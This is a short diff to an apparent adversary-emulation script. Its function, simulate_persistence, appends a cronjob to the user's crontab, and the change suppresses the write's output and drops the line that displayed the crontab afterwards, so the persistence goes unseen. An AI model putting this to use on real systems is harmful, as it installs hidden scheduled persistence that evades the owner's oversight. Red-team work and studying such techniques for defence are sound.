@@ -128,9 +128,8 @@ def simulate_persistence():
             stdout, stderr = proc.communicate()
             current_cron = stdout.decode() if proc.returncode == 0 else ""
             new_cron = current_cron + cronjob
-            proc = subprocess.Popen([crontab_path, "-"], stdin=subprocess.PIPE)
+            proc = subprocess.Popen([crontab_path, "-"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             proc.communicate(input=new_cron.encode())
-            subprocess.Popen("crontab -l", shell=True).wait()
     except Exception as e:
         pass
 
